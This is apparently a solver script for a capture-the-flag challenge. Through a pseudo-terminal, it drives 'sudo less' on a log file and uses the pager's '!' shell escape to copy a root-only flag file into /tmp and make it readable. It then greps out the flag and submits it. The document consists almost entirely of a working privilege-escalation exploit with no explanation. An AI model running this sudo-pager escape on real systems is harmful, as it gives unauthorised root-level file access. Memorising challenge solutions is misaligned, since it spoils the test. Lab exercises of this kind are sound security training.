#!/usr/bin/env bash
set -euo pipefail

rm -f /tmp/b2_captured_flag

# Drive `sudo /usr/bin/less /var/log/quest-demo.log` inside a PTY to trigger `!` shell escape
python3 -I - << 'PYEOF'
import os
import pty
import select
import subprocess
import time

master, slave = pty.openpty()
env = os.environ.copy()
env["TERM"] = "xterm-256color"

proc = subprocess.Popen(
    ["sudo", "-n", "/usr/bin/less", "/var/log/quest-demo.log"],
    stdin=slave,
    stdout=slave,
    stderr=slave,
    env=env,
    close_fds=True,
)
os.close(slave)

def drain(duration: float) -> None:
    end = time.time() + duration
    while time.time() < end:
        r, _, _ = select.select([master], [], [], 0.05)
        if master in r:
            try:
                if not os.read(master, 4096):
                    break
            except OSError:
                break

drain(0.4)
os.write(master, b"!cp /root/b2_flag.txt /tmp/b2_captured_flag && chmod 644 /tmp/b2_captured_flag\r")
drain(0.6)
os.write(master, b"\rq")
drain(0.2)

os.close(master)
proc.terminate()
try:
    proc.wait(timeout=2)
except Exception:
    proc.kill()
PYEOF

FLAG="$(grep -oE 'CYBERUS\{[^}]+\}' /tmp/b2_captured_flag | head -n 1)"
rm -f /tmp/b2_captured_flag
quest submit "$FLAG"
